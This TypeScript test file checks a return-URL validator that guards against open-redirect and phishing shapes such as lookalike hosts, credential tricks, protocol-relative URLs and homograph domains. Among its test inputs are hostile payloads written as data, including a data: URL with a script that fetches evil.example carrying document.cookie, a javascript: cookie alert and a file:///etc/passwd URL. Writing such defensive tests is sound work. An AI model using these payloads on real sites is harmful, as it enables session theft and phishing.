// The return-URL check is the one piece of this package where a bug is not a
// bug but a phishing vector, so the attack shapes are written down rather than
// trusted to a careful reading.
//
//   node --test --experimental-strip-types packages/identity/test/

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { safeReturnUrl, isSafeReturnUrl } from '../src/return-url.ts';

const FALLBACK = '/';

test('keeps a relative path, which is the common case', () => {
  assert.equal(safeReturnUrl('/risansi/pipeline'), '/risansi/pipeline');
  assert.equal(safeReturnUrl('/risansi/complaints/123?tab=log'), '/risansi/complaints/123?tab=log');
});

test('keeps our own hosts', () => {
  for (const u of [
    'https://sales.risansi.com/risansi/pipeline',
    'https://rndtesting.risansi.com/',
    'https://so2dispatch.risansi.com/orders?id=7',
    'https://risansi.com/',
  ]) {
    assert.equal(isSafeReturnUrl(u), true, u);
  }
});

test('refuses a host that merely contains ours', () => {
  // The one people get wrong: a naive `includes('risansi.com')` passes all of
  // these, and every one of them is somebody else's server.
  for (const u of [
    'https://risansi.com.evil.example/',
    'https://evil.example/?next=risansi.com',
    'https://notrisansi.com/',
    'https://sales.risansi.com.evil.example/',
    'https://evil.example/sales.risansi.com',
  ]) {
    assert.equal(safeReturnUrl(u, FALLBACK), FALLBACK, u);
  }
});

test('refuses credentials used to make the host look right', () => {
  // Reads as sales.risansi.com to a person skimming; the browser goes to
  // evil.example.
  assert.equal(safeReturnUrl('https://sales.risansi.com@evil.example/', FALLBACK), FALLBACK);
  assert.equal(safeReturnUrl('https://user:pw@evil.example/', FALLBACK), FALLBACK);
});

test('refuses a protocol-relative URL that looks like a path', () => {
  // Starts with a slash, is not relative: same scheme, different host.
  assert.equal(safeReturnUrl('//evil.example/', FALLBACK), FALLBACK);
  assert.equal(safeReturnUrl('//sales.risansi.com.evil.example/', FALLBACK), FALLBACK);
});

test('refuses backslashes, which some parsers read as slashes', () => {
  assert.equal(safeReturnUrl('/\\evil.example', FALLBACK), FALLBACK);
  assert.equal(safeReturnUrl('https:\\\\evil.example', FALLBACK), FALLBACK);
});

test('refuses schemes a redirect must never follow', () => {
  for (const u of [
    'javascript:alert(document.cookie)',
    'data:text/html,<script>fetch("https://evil.example?c="+document.cookie)</script>',
    'file:///etc/passwd',
    'vbscript:msgbox',
  ]) {
    assert.equal(safeReturnUrl(u, FALLBACK), FALLBACK, u);
  }
});

test('refuses an internationalised lookalike', () => {
  // Cyrillic а in "risаnsi". Renders almost identically; hostname is punycode,
  // so it cannot end with the ASCII suffix.
  assert.equal(safeReturnUrl('https://sales.risаnsi.com/', FALLBACK), FALLBACK);
});

test('refuses plaintext http on a real host', () => {
  // The cookie is marked Secure; handing somebody to http would either drop the
  // session or, worse, invite a downgrade on the way.
  assert.equal(safeReturnUrl('http://sales.risansi.com/', FALLBACK), FALLBACK);
});

test('falls back on nothing, empty and rubbish', () => {
  for (const u of [null, undefined, '', '   ', 'not a url', 'http://']) {
    assert.equal(safeReturnUrl(u as string | null, FALLBACK), FALLBACK, String(u));
  }
});

test('the fallback is returned verbatim, so a caller can choose it', () => {
  assert.equal(safeReturnUrl('https://evil.example/', '/portals'), '/portals');
});
